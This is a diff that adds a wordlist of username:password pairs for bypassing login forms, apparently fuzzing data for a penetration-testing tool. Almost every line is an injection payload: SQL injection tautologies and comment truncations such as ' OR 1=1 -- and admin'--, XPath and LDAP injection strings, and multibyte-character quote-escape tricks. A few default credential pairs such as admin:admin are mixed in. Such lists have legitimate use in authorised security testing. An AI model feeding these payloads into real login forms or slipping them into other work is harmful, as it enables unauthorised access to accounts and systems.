@@ -1,0 +1,50 @@
+__USERNAME__:' oR 'x'='x
+admin:[{}]
+[{}]:[{}]
+demo:demo
+test:test
+admin:admin'--
+admin:admin' --
+admin:admin' --;
+admin' --:admin
+admin' --;:admin
+admin'--:admin
+foo:foo'] | P | //user[username='admin
+尐' or 'x'='x' #;:foo
+尐' || 'x'='x' #;:foo
+尐' OR 1=1 --:foo
+尐' OR 1=1 #;:foo
+' || 'x'='x' #;:foo
+' OR 1=1 --:foo
+' OR 1=1 #;:foo
+尐' || 1=1 #:foo
+admin--:foo
+admin' or 1=1:foo
+admin' or 1=1-- :foo
+admin' or 1=1;# /*:foo
+admin' or 'x'='x':foo", 'user=*)(uid=*))(|(uid=*:password
+admin)(&)):password
+admin:admin--
+admin:foo' or 1=1
+foo:') OR '1' = '1' LIMIT 1 --
+foo:' OR '1' = '1' LIMIT 1 --
+admin:foo' or 1=1--
+'or select *:foo
+' or 0=0 --:foo
+foo:' or 0=0 --
+"or 0=0 --:foo
+' or 0=0 #:foo
+admin:8bf7b464aaa2c2b536aa1d76a1297c19155f5603
+8bf7b464aaa2c2b536aa1d76a1297c19155f5603:foo
+admin:' OR 'a'='a'
+' or 0=0 #:foo
+foo:' or 0=0 #
+' or 0=0 #:foo
+admin" or "a"="a:foo
+admin" or 1=1 --:foo
+admin' or 1=1 --:foo
+admin' or 'a'='a:foo
+admin') or ('a'='a:foo
+'admin") or ("a"="a:foo
+admin' or 'x'='x':foo
+foo:'||1='1:
